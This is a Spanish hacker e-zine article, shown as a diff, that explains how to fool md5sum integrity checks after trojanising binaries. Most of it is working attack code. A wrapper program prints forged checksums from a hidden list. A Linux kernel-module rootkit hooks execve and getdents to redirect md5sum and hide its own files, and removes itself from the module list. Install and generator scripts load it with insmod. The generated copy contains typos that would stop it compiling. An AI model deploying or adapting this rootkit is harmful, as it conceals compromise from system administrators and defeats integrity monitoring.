@@ -1,0 +1,779 @@
+     -=( 7A69#12 )=--=( art9 )=--=( Evadiendo md5sum )=--=( IReick )=-
+       
+
+EVADIENDO MD5SUM - ireick
+-------------------------
+
+Charlando un dia con alguien sobre la troyanizacion del software, sus 
+ventajes y desventajas, enseguida salio el tema de lo facil que es 
+para un administrador usar el checksum del fichero para darse cuenta 
+de que el software ha sido modificado. Pues bien en este pequeño articulo 
+expongo una posbile solución para evitar darse cuenta de la integridad de 
+un archivo mediante una herramienta de uso común como es md5sum.
+
+NOTA: UTILIZAR LKM PARA REDIRECCIONAR EJECUTABLES Y ASI SALTARSE HERRAMIENTAS
+COMO MD5SUM O TRIPWARE ES ALGO QUE YA HA APARECIDO EN OTROS SITIOS. LA PRIMERA
+VEZ QUE LEI ALGO SOBRE ESTO FUE EN PHRACK (veanse referencias)
+--EVITANDO MD5SUM--
+
+Bien, vamos a abordar el problema, veamos que es lo que pasa si se utiliza 
+md5sum para verificar un archivo, imaginemos el siguiente codigo, muy dificil 
+de imaginar no es verdad :P
+
+[illo@localhost apache]$ cat hola.c
+main() {
+printf("hola\n");
+}
+
+Muy bien vamos a compilar y pasarle md5sum al binario:
+
+[illo@localhost apache]$ gcc hola.c -ohola
+[illo@localhost apache]$ md5sum hola
+35317b4565538f4daa130314a465d25a  hola
+
+Bien ahora vamos a hacer una pequeña modificacion en hola.c:
+
+[illo@localhost apache]$ cat hola.c
+main() {
+printf("hola\n");
+printf("adios\n");
+}
+
+Compilamos y pasamos md5sum:
+
+[illo@localhost apache]$ gcc hola.c -ohola
+[illo@localhost apache]$ md5sum hola
+bef1ac85326b858bf927f882a20cb964  hola
+
+Vaya, que es lo que ha pasado? Pues sencillo hemos modificado el codigo, por
+lo tanto el binario, por lo tanto el checksum del fichero ha cambiado, 
+conclusion, no se puede asegurar la integridad del binario :P
+
+Ahora bien q pasa si ahora hicieramos:
+
+[illo@localhost apache]$ md5sum hola
+
+y nos encontraramos con:
+ 
+35317b4565538f4daa130314a465d25a  hola
+
+En este caso lo veriamos todo en orden y no nos preocupariamos por la 
+integridad (me ha gustao esta palabra :P) del binario.
+
+Bien, pero, como conseguir esto? pues a mi se me ocurre una cosa (a mi y a otra
+mucha gente :P) lkm (loadable kernel modules), muy bien y q hacemos con un lkm,
+pues veamos:
+
+[illo@localhost apache]$ strace md5sum hola
+execve("/usr/bin/md5sum", ["md5sum", "hola"], [/* 28 vars */]) = 0
+uname({sys="Linux", node="localhost.localdomain", ...}) = 0
+-brk(0)                                  = 0x80508a4
+old_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x40017000
+open("/etc/ld.so.preload", O_RDONLY)    = -1 ENOENT (No such file or directory)
+open("/etc/ld.so.cache", O_RDONLY)      = 3
+                           = 0
+
+....
+....
+....
+
+open("hola", O_RDONLY|O_LARGEFILE)      = 3
+fstat64(3, {st_mode=S_IFREG|0775, st_size=13617, ...}) = 0
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x40022000
+read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\2\0\3\0\1\0\0\0`\203\4"..., 4096) = 4096
+read(3, "5535;\0signed char:t(0,10)=@s8;r("..., 4096) = 4096
+read(3, "ONV_NOMEM:3,__GCONV_EMPTY_INPUT:"..., 4096) = 4096
+read(3, "\204\203\4\10\0\0\0\0\2\0\f\0+\0\0\0\0\0\0\0\0\0\0\0\4"..., 4096) = 1329
+read(3, "", 4096)                       = 0
+read(3, "", 4096)                       = 0
+close(3)                                = 0
+munmap(0x40022000, 4096)                = 0
+fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 4), ...}) = 0
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x40022000
+ioctl(1, TCGETS, {B38400 opost isig icanon echo ...}) = 0
+write(1, "bef1ac85326b858bf927f882a20cb964"..., 39bef1ac85326b858bf927f882a20cb964  hola
+) = 39
+munmap(0x40022000, 4096)                = 0
+_exit(0)                                = ?
+
+Bueno una vez hecho esto, podemos llegar facilmente a la conclusion de que 
+podemos interceptar execve 
+
+execve("/usr/bin/md5sum", ["md5sum", "hola"], [/* 28 vars */]) = 0
+
+para que en vez de md5sum se ejecute alguna otra cosa cuando se le pase como
+argv[1] hola (tb podriamos optar por interceptar open, pero nos quedamos
+con execve :)
+
+--QUE EJECUTAMOS EN VEZ DE MD5SUM--
+
+Bien lo primero que hemos de pensar es en que vamos a ejecutar en vez de 
+md5sum, bien lo que yo propongo es lo siguiente, usar un programa q mantenga 
+en un fichero una lista con archivos y cadenas que queremos que se muestren si
+se hiciera un md5sum de dicho archivo, de forma q podamos añadir entradas a
+esta pequeña "base de datos" llamando al programa con una determinada 
+opcion (en este caso programa -a). 
+Asi cuando se ejecute md5sum el lkm interceptara execve y llamara a este 
+programa que consultara en la lista si existe el programa y si esta mostrara 
+la cadena que hemos especificado, sino se ejecutara md5sum. Si no hemos 
+pasado a md5sum como opcion un archivo, es decir que se le ha pasado algo 
+como "--help" este programa hara que se ejecute md5sum --help. Para conseuir 
+esto ultimo necesitamos hacer una copia de md5sum  a md6sum porque sino cuando
+como veremos malo llamase a md5sum el execve seria interceptado por el lkm que
+a su ver volveria a llamar a malo y bueno ya os imaginais el resto :P
+Bueno, dejo de decir cosas que me lio y pasteo el codigo que seguro que se 
+entiende mucho mejor a el que a mi :)
+
+---------aqui empieza malo.c--------------------------------------------------
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+struct {
+	char programa[25]; 
+	char cadena[50];
+	} lista;
+
+void anade() {
+	FILE *fichero;
+	fichero = fopen("/bin/lista.txt", "a");
+	printf("Programa: ");
+	fflush(stdout);
+	gets(lista.programa);
+	printf("Cadena: ");
+	gets(lista.cadena);
+	fwrite(&lista, sizeof(lista), 1, fichero);
+	fclose(fichero);
+}
+
+void muestra(char *argumento) {
+	int i;
+	FILE *fichero;
+	fichero = fopen("/bin/lista.txt", "r");
+	i=0;
+	while (!feof(fichero)) {
+		fread(&lista, sizeof(lista), 1, fichero);
+		if (!strcmp(lista.programa, argumento) && (i==0)) {
+			printf("%s  %s\n", lista.cadena, lista.programa);
+			i=1;
+		}
+	}
+	fclose(fichero);
+	if (i==0)
+		execl("/usr/bin/md6sum", "md6sum", argumento, 0);
+}
+
+void main(int argc, char **argv) {
+	if (argc > 1) {
+		if (!strcmp(argv[1], "-a"))
+			anade();
+		else if (!strcmp(argv[1], "-b")) {
+			muestra(argv[2]);
+		}
+		else if (!strcmp(argv[1], "-t")) {
+			muestra(argv[2]);
+		}
+		else {
+			muestra(argv[1]);
+		}
+	}
+	else	
+		execl("/usr/bin/md6sum", "md6sum", 0);
+}
+
+----------aqui acaba malo.c-----------------------------------------------
+
+--EL LKM--
+
+Bueno pues ahora nos queda codear el lkm que tendria que hacer lo siguiente:
+1-Redireccionar el ejecutable cuando intentemos hacer un md5sum.
+2-Ocultar tanto nuestro ejecutable malo como el archivo lista.txt como md6sum 
+ante por ejemplo un ls.
+3-Pues pasar desapercibido ante, un lsmod por decir algo :P (si quereis 
+  entender mejor este apartado os remito al texto sobre Ripe en este mismo 
+  numero sobre LKM)
+
+Muy bien pues para el primer proposito hemos dicho que tenemos que interceptar
+la syscall execve y para el segundo proposito necesitamos interceptar la 
+syscall getdents (estamos usando un kernel 2.2.14) como vemos a continuacion:
+
+[illo@localhost illo]$ strace ls > /dev/null
+........
+........
+........
+open(".", O_RDONLY|O_NONBLOCK|O_DIRECTORY) = 3
+fstat(3, {st_mode=S_IFDIR|0700, st_size=1024, ...}) = 0
+fcntl(3, F_SETFD, FD_CLOEXEC)           = 0
+brk(0x805a000)                          = 0x805a000
+getdents(3, /* 7 entries */, 3391)      = 148 |__ aqui ta :):
+getdents(3, /* 0 entries */, 3391)      = 0   |
+close(3)                                = 0
+......
+......
+......
+
+Bien y para nuestro tercer proposito, lo que vamos a hacer es lo siguiente,
+basicamente se trata de acceder al simbolo kernel_module y asi poder acceder a 
+module_list ya que entre ellos hay un offset que conocemos. Asi desde nuestro
+modulo hemos de llegar al kernel_module (cuando next valga NULL) y como 
+conocemos el offset... exacto tenemos acceso a module_list, ahora podemos 
+recorrer la lista enlazada que se usa para guardar los modulos y ocultar el 
+modulo que queramos, esta tecnica, aqui digamos "pierde potencial" pero 
+imaginaos que queremos ocultar un modulo que cargamos despues de el modulo 
+que se encargara de ocultar modulos (ala ahi no os lieis ep :P) podemos usar 
+esta tecnica para poder acceder a module_list :). Si quereis saber mas sobre 
+ocultacion de modulos, lo dicho, el doc sobre LKM's de Ripe publicado en este 
+mismo numero de la e-zine, no tiene desperdicio.
+
+Bueno pues aqui esta el lkm:
+
+---------------lkm.c empieza aqui
+#define __KERNEL__
+#define MODULE
+
+#include <linux/ctype.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/version.h>
+#include <linux/malloc.h>
+#include <linux/dirent.h>
+#include <linux/unistd.h>
+#include <sys/syscall.h>
+
+#define __NR_mexecve 200
+#define MALO "/bin/malo"
+
+int errno;
+static inline _syscall1(int, brk, void *, end_data_segment);
+
+extern void *sys_call_table[];
+
+void *module_list=NULL;
+void *tmp;
+
+int (*o_execve)(const char *filename, const char *argv [], const char *envp[]);
+int (*o_getdents)(unsigned int fd, struct dirent *dirp, unsigned int count);
+
+void *get_module_list() {
+struct module *m=&__this_module;
+while(m->next)
+	m=m->next;
+module_list=m+1;
+}
+
+void hide_lkm() {
+void **tmp;
+struct module *m;
+struct module *m2;
+struct module *lkm=&__this_module;
+
+tmp=(void **)module_list;
+for(m=(*tmp), m2=NULL; m; m2=m, m=m->next)
+	if(!strcmp(m->name, lkm->name)) 
+		break;
+if (m2)
+	m2->next=m->next;
+else
+	(*tmp)=m->next;
+}
+
+int mexecve(const char *filename, const char *argv [], const char *envp[])
+{
+	long __res;
+	__asm__ volatile ("int $0x80":"=a" (__res):"0"(__NR_mexecve), "b"((long) (filename)), "c"((long) (argv)), "d"((long) (envp)));
+	return (int) __res;
+}
+
+int ocultar(char *archivo) {
+	if (!strcmp("malo", archivo))
+		return(1);
+	else if(!strcmp("lista.txt", archivo))
+		return(1);
+        else if(!strcmp("md6sum", archivo))
+                return(1);
+	else
+		return(0);
+}
+
+int mi_execve(const char *filename, const char *argv [], const char *envp) {
+int ret;
+int mmm;
+char *exec=kmalloc(strlen(filename)+1, GFP_KERNEL);
+memset(exec, 0, strlen(filename)+1);
+__generic_copy_from_user(exec, filename, strlen(filename));
+if (!strcmp("/usr/bin/md5sum", exec)) {
+	kfree(exec);
+	mmm=current->mm->brk;
+	brk((void *)mmm+strlen(MALO)+1);
+	__generic_copy_to_user((void *)mmm, MALO, strlen(MALO) + 1);
+	ret=mexecve((void *)mmm, (char **)argv, (char **)envp); 
+	brk((void *)mmm);
+	return(ret);
+}
+kfree(exec);
+return(mexecve(filename, (char **)argv, (char **)envp));
+}
+
+int mi_getdents(unsigned int fd, struct dirent *dirp, unsigned int count) {
+int ret;
+int i=0;
+struct dirent *mdirp, *mdirp2, *d1, *d2;
+char *ptr;
+ret=(*o_getdents)(fd, dirp, count);
+
+if (ret < 0)
+	return(ret);
+mdirp=(struct dirent*)kmalloc(ret, GFP_KERNEL);
+mdirp2=(struct dirent*)kmalloc(ret, GFP_KERNEL);
+__generic_copy_from_user(mdirp, dirp, ret);
+memset(mdirp2, 0, ret);
+__generic_copy_to_user(dirp, mdirp2, ret);
+d1=mdirp;
+d2=mdirp2;
+while(ret>0) {
+	ret-=d1->d_reclen;
+	if((ocultar(d1->d_name))==0) {
+		memcpy(d2, d1, d1->d_reclen);
+		i+=d2->d_reclen;
+		ptr=(char *)d2;
+		ptr+=d2->d_reclen;
+		d2=(struct dirent*)ptr;
+		}
+	ptr=(char *)d1;
+	ptr+=d1->d_reclen;
+	d1=(struct dirent*)ptr;
+	}
+__generic_copy_to_user(dirp, mdirp2, i);
+kfree(mdirp);
+kfree(mdirp2);
+return(i);
+}	
+int init_module() {
+get_module_list();
+hide_lkm();
+o_execve=sys_call_table[__NR_execve];
+tmp=sys_call_table[__NR_mexecve];
+sys_call_table[__NR_mexecve]=o_execve;
+sys_call_table[__NR_execve]=mi_execve;
+o_getdents=sys_call_table[__NR_getdents];
+sys_call_table[__NR_getdents]=mi_getdents;
+return(0);
+}
+
+void cleanup_module() {
+sys_call_table[__NR_execve]=o_execve;
+sys_call_table[__NR_mexecve]=tmp;
+sys_call_table[__NR_getdents]=o_getdents;
+}
+-----------------lkm.c acaba aqui------------
+
+--PRUEBAS--
+Muy bien, pues ya lo tenemos casi todo, ahora incluyo un pequeño script
+que se encarga de compilar y poner en marcha todo el codigo :)
+
+-----------------Aqui empieza install-------------
+
+cp /usr/bin/md5sum /usr/bin/md6sum
+gcc malo.c -omalo
+mv malo /bin/malo
+gcc -O2 -I/usr/src/linux/include/ -c lkm.c
+insmod lkm.o
+
+-----------------Aqui acaba install----------------
+
+Bueno pues ya lo tenemos todo :) Ahora toca probar, para ello volvamos con
+el ejemplo del programa hola :P, recordemos que es lo que pasaba al hacer
+un md5sum de la "segunda version" del programa:
+
+[illo@localhost apache]$ md5sum hola
+bef1ac85326b858bf927f882a20cb964  hola
+
+Vale, ahora hagamos uso de lo que hemos ido haciendo en este artículo :)
+
+
+root@localhost md5]# ls
+install  lkm.c  malo.c
+
+[root@localhost md5]# ./install
+algunos warnings :P
+
+[root@localhost md5]# lsmod
+Module                  Size  Used by
+BusLogic                87820   2
+
+mmm onde tara lkm :)
+
+[root@localhost md5]# ls /bin
+arch          csh            gawk        mail           remadmin   tcsh
+ash           date           gawk-3.0.4  mkdir          rm         touch
+ash.static    dd             grep        mknod          rmdir      true
+awk           df             gtar        mktemp         rpm        umount
+basename      dmesg          gunzip      more           rvi        uname
+bash          dnsdomainname  gzip        mount          rview      userconf
+bash2         doexec         hostname    mt             sed        usleep
+bsh           domainname     igawk       mv             setserial  vi
+cat           echo           ipcalc      netconf        sh         view
+chgrp         ed             kill        netstat        sleep      vimtutor
+chmod         egrep          linuxconf   nice           sort       ypdomainname
+chown         ex             ln          nisdomainname  stty       zcat
+consolechars  false          loadkeys    ps             su
+cp            fgrep          login       pwd            sync
+cpio          fsconf         ls          red            tar
+
+mmm onde tara malo :) (algo como esto pasa con lista.txt y md6sum ;)
+
+[root@localhost md5]# md5sum -a
+Programa: hola
+Cadena: 35317b4565538f4daa130314a465d25a
+
+mmm no sabia q md5sum tuviera esa opcion :)
+
+
+root@localhost md5]# cd ..
+[root@localhost /root]# ls
+... hola ...
+[root@localhost /root]# md5sum hola
+35317b4565538f4daa130314a465d25a  hola
+
+mmm vay vaya pero si esto era antes de la modificacion... :)
+
+[root@localhost /root]# md5sum -b hola
+35317b4565538f4daa130314a465d25a  hola
+
+mmm pos si si "parece" que nada haya cambiado en hola :P
+
+
+ot@localhost md5]# md5sum --version
+md5sum (GNU textutils) 2.0a
+Written by Ulrich Drepper.
+
+Copyright (C) 1999 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.  There is NO
+warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+
+mmm pos "parece" q md5sum rula bien :)
+
+Bueno pues para acabar incluyo un script de configuracion que salio a
+partir de una conversacion con alguien sobre la posibilidad de hacer 
+que el programa fuera configurable.
+
+-----------aqui empieza configure.sh--------
+#!/bin/sh
+
+escribealgo () {
+	echo "escribe algo!"
+	exit
+}
+
+echo -e "Script de configuracion"
+echo ""
+
+echo -n "Path completo al archivo de configuracion: "
+read CONFIG
+if [ -z $CONFIG ]; then
+	escribealgo
+fi
+echo -n "Path del ejecutable md5sum real: "
+read MD5_REAL_BIN
+if [ -z $MD5_REAL_BIN ]; then
+	escribealgo
+fi
+echo -n "Path completo al ejecutable sustituto de md5sum: "
+read MD5_FAKE_BIN
+if [ -z $MD5_FAKE_BIN ]; then
+	escribealgo
+fi
+echo -n "Nombre del ejecutable sustituto de md5sum: "
+read MD5_FAKE_BIN_NAME
+if [ -z $MD5_FAKE_BIN_NAME ]; then
+	escribealgo
+fi
+
+echo ""
+echo -n "Generando malo.c "
+cat << EOF > malo.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define CONFIG_FILE	"$CONFIG"
+#define MD5_FAKE_BIN	"$MD5_FAKE_BIN"
+#define MD5_FAKE_BIN_NAME	"$MD5_FAKE_BIN_NAME"
+struct {
+	char programa[25]; 
+	char cadena[50];
+	} lista;
+
+void anade() {
+	FILE *fichero;
+	fichero = fopen(CONFIG_FILE, "a");
+	printf("Programa: ");
+	fflush(stdout);
+	gets(lista.programa);
+	printf("Cadena: ");
+	gets(lista.cadena);
+	fwrite(&lista, sizeof(lista), 1, fichero);
+	fclose(fichero);
+}
+
+void muestra(char *argumento) {
+	int i;
+	FILE *fichero;
+	fichero = fopen(CONFIG_FILE, "r");
+	i=0;
+	while (!feof(fichero)) {
+		fread(&lista, sizeof(lista), 1, fichero);
+		if (!strcmp(lista.programa, argumento) && (i==0)) {
+			printf("%s  %s\n", lista.cadena, lista.programa);
+			i=1;
+		}
+	}
+	fclose(fichero);
+	if (i==0)
+		execl(MD5_FAKE_BIN, MD5_FAKE_BIN_NAME, argumento, 0);
+}
+
+void main(int argc, char **argv) {
+	if (argc > 1) {
+		if (!strcmp(argv[1], "-a"))
+			anade();
+		else if (!strcmp(argv[1], "-b")) {
+			muestra(argv[2]);
+		}
+		else if (!strcmp(argv[1], "-t")) {
+			muestra(argv[2]);
+		}
+		else {
+			muestra(argv[1]);
+		}
+	}
+	else	
+		execl(MD5_FAKE_BIN,MD5_FAKE_BIN_NAME, 0);
+}
+EOF
+
+echo "Ok!"
+echo -n "Generando lkm.c "
+
+cat << EOF > lkm.c
+#define __KERNEL__
+#define MODULE
+
+#include <linux/ctype.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/version.h>
+#include <linux/malloc.h>
+#include <linux/dirent.h>
+#include <linux/unistd.h>
+#include <sys/syscall.h>
+
+#define __NR_mexecve 200
+#define MALO "/bin/malo"
+
+int errno;
+static inline _syscall1(int, brk, void *, end_data_segment);
+
+extern void *sys_call_table[];
+
+void *tmp;
+
+int (*o_execve)(const char *filename, const char *argv [], const char *envp[]);
+int (*o_getdents)(unsigned int fd, struct dirent *dirp, unsigned int count);
+
+void *get_module_list() {
+struct module *m=&__this_module;
+while(m->next)
+	m=m->next;
+module_list=m+1;
+}
+
+void hide_lkm() {
+void **tmp;
+struct module *m;
+struct module *m2;
+struct module *lkm=&__this_module;
+
+tmp=(void **)module_list;
+for(m=(*tmp), m2=NULL; m; m2=m, m=m->next)
+	if(!strcmp(m->name, lkm->name)) 
+		break;
+if (m2)
+	m2->next=m->next;
+else
+	(*tmp)=m->next;
+}
+
+int mexecve(const char *filename, const char *argv [], const char *envp[])
+{
+	long __res;
+	__asm__ volatile ("int \$0x80":"=a" (__res):"0"(__NR_mexecve), "b"((long) (filename)), "c"((long) (argv)), "d"((long) (envp)));
+	return (int) __res;
+}
+
+int ocultar(char *archivo) {
+	if (!strncmp("malo", archivo,strlen("malo")))
+		return(1);
+	else if(!strncmp("$CONFIG_FILE", archivo,strlen("$CONFIG_FILE")))
+		return(1);
+	else if(!strncmp("$CONFIG_FILE", archivo,strlen("$CONFIG_FILE")))
+		return(1);
+	else
+		return(0);
+}
+
+int mi_execve(const char *filename, const char *argv [], const char *envp) {
+int ret;
+int mmm;
+char *exec=kmalloc(strlen(filename)+1, GFP_KERNEL);
+memset(exec, 0, strlen(filename)+1);
+__generic_copy_from_user(exec, filename, strlen(filename));
+if (!stnrcmp("$MD5_REAL_BIN", exec,strlen("$MD5_REAL_BIN")) {
+	kfree(exec);
+	mmm=current->mm->brk;
+	brk((void *)mmm+strlen(MALO)+1);
+	__generic_copy_to_user((void *)mmm, MALO, strlen(MALO) + 1);
+	ret=mexecve((void *)mmm, (char **)argv, (char **)envp); 
+	brk((void *)mmm);
+	return(ret);
+}
+kfree(exec);
+return(mexecve(filename, (char **)argv, (char **)envp));
+}
+
+int mi_getdents(unsigned int fd, struct dirent *dirp, unsigned int count) {
+int ret;
+int i=0;
+struct dirent *mdirp, *mdirp2, *d1, *d2;
+char *ptr;
+ret=(*o_getdents)(fd, dirp, count);
+
+if (ret < 0)
+	return(ret);
+mdirp=(struct dirent*)kmalloc(ret, GFP_KERNEL);
+mdirp2=(struct dirent*)kmalloc(ret, GFP_KERNEL);
+__generic_copy_from_user(mdirp, dirp, ret);
+memset(mdirp2, 0, ret);
+__generic_copy_to_user(dirp, mdirp2, ret);
+d1=mdirp;
+d2=mdirp2;
+while(ret>0) {
+	ret-=d1->d_reclen;
+	if((ocultar(d1->d_name))==0) {
+		memcpy(d2, d1, d1->d_reclen);
+		i+=d2->d_reclen;
+		ptr=(char *)d2;
+		ptr+=d2->d_reclen;
+		d2=(struct dirent*)ptr;
+		}
+	ptr=(char *)d1;
+	ptr+=d1->d_reclen;
+	d1=(struct dirent*)ptr;
+	}
+__generic_copy_to_user(dirp, mdirp2, i);
+kfree(mdirp);
+kfree(mdirp2);
+return(i);
+}	
+int init_module() {
+get_module_list();
+hide_lkm();
+o_execve=sys_call_table[__NR_execve];
+tmp=sys_call_table[__NR_mexecve];
+sys_call_table[__NR_mexecve]=o_execve;
+sys_call_table[__NR_execve]=mi_execve;
+o_getdents=sys_call_table[__NR_getdents];
+sys_call_table[__NR_getdents]=mi_getdents;
+return(0);
+}
+
+void cleanup_module() {
+sys_call_table[__NR_execve]=o_execve;
+sys_call_table[__NR_mexecve]=tmp;
+sys_call_table[__NR_getdents]=o_getdents;
+}
+EOF
+
+echo "Ok!"
+echo -n "Generando install "
+
+cat << EOF > install
+cp $MD5_REAL_BIN $MD5_FAKE_BIN
+gcc malo.c -omalo
+mv malo /bin/malo
+gcc -O2 -I/usr/src/linux/include/ -c lkm.c
+insmod lkm.o
+EOF
+
+echo "Ok!"
+-----------aqui acaba configure.sh----------
+
+--REFERENCIAS--
+
+ARTÍULOS:
+SET 22. "Linux Kernel Modules"
+Autor: Doing 
+
+Netsearch 5 "LKM: el backdoor perfecto"
+Autor: Doing
+
+7a69 12:"Linux LKMs; Troyanizando el kernel"
+Autor: Ripe
+
+Phrack 51. "Bypassing Integrity Checking Systems"
+Autor: halflife
+
+Phrack 52. "Weakening the Linux Kernel"
+Autor: plaguez
+
+"(nearly) Complete Linux Loadable Kernel Modules"
+Autor: Pragmatic
+
+CODIGO:
+Fuentes Kernel de linux 
+
+fog 2.0.0g
+Autores: Ripe
+
+Knark v0.50
+Autor: Creed
+
+Saint Jude - Linux Kernel Module 0.10
+Autor: Tim Lawless
+
+--DESPEDIDA--
+
+Pues nada se acabo :) un saludote para todos, agradecimientos a todos aquellos
+que se han interesado en este sencillo txt y han hecho que sea mejor :_)  
+y mi e-mail para cualquier cosa ireick@7a69ezine.org
+
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: GnuPG v1.0.4 (GNU/Linux)
+Comment: Gnome PGP version 0.4
+
+mQGiBDuzPkkRBADTC8dJqxzpd0Wy6kL106AVPT4KDLqR0yY/vs0Sm0NAOzQuJI1w
+GQG2josgN91azF1UirPbDRMK6EY1VEQGqhZ3lutCoa5w3tGbhiqmozXQieLItL41
+lSNp/8A9vtelvAK75ctKzO5exLSUe0mKwiAUgqWvZmMa577IoGiYA8Ab/wCgvlfr
+3Vke9N1RSJo3BSY1aT9GdSkD/2ER7dEiN5I0Oav8p/PLmP3N7CfTMhebvN5YyLcL
+0bOUfgX7S8D9mP28Lmi3rU10GcPNMm3Ovr4HhBBet7lPabUeqrxtsYefNbo5u8pT
+c5yg5g3GA9fW4WN+qQN0Hvw4tBUnxrI6WrjI5VAdbpWFDP2Tdjq2DHQRgb9v5Ha7
+C/XCA/4xzo7i60GNcZnkUY4EbI5nkF6p92GZw2S3PtjUxUgivT4OlYb2VRzREklf
+jjfUOXdQ7qMGDAVPucLZpvpYN0yVR1qhJa+TJYrAwyuzw/CbR/X8r1vCGBAHHbxf
+NJ9XdPaUqVu4BE08YG3zhHfIWHWuwB0S8MSaIlqop0JP7HI2ubQdaXJlaWNrIDxp
+cmVpY2tAN2E2OWV6aW5lLm9yZz6IVwQTEQIAFwUCO7M+SQULBwoDBAMVAwIDFgIB
+AheAAAoJECWqUFPmUg390wkAnjl4kWxIUlhkGHmAQuZt5QJVWaY/AJ0Ta7GJpmVQ
+CpnT21Gzfqy1XYJ0DbkBDQQ7sz5MEAQA4N13LoE096UV+C76YkPSTJLActiN5qqu
+9aAZlsG64Ir/VOXa5nsZN0O3Tx5SRxTlGq7L4Y6l9P5rmsGtYJpHWoZFaEx3EBpn
+ucreSzna1m834miJxK1QXEk9W8V0XnTBsS+ZAxkH1DiTzDeLbUHvrBihUV1simyJ
+eIc9j/YJiZ8ABAsD/jl7vW3EFaufbunpnfFBXE+rUFdCqRMwYaLQkfUFD5zP/b6u
+lQV8op2aGslOaBzWV2X7OFdtY8fdjaInvEGMlJwbaKTTaGVRw+6CelV8GBrGkIku
+8QGmx5e+AUWeB67FZzdecfu9Mw0gJF+bmky5W5EiFfKDxmHpBtYYlGZBJnkniEYE
+GBECAAYFAjuzPkwACgkQJapQU+ZSDf367wCcC7rJw1D6GwXb5XJ7EfavjzV2+hkA
+oKum9N9MP/L9DZdpuPvfn29dRq/m
+=OeAb
+-----END PGP PUBLIC KEY BLOCK-----
+
+*EOF*
